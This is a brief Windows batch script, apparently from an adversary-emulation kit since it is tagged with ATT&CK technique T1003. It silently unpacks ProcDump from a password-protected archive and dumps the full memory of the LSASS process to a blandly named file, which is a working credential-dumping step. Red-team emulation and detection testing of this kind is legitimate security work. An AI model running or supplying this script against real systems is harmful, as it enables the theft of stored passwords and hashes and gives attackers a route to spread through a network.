@ECHO OFF

ECHO ===========================================================================
ECHO LSASS DUMP - T1003
ECHO Dumping LSASS memory with ProcDump
ping -n 5 127.0.0.1 > NUL

"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%PUBLIC%" toolset\procdump64.exe > NUL

"%PUBLIC%\procdump64.exe" -accepteula -ma lsass.exe "%APTDIR%\somethingwindows.dmp" 2>&1
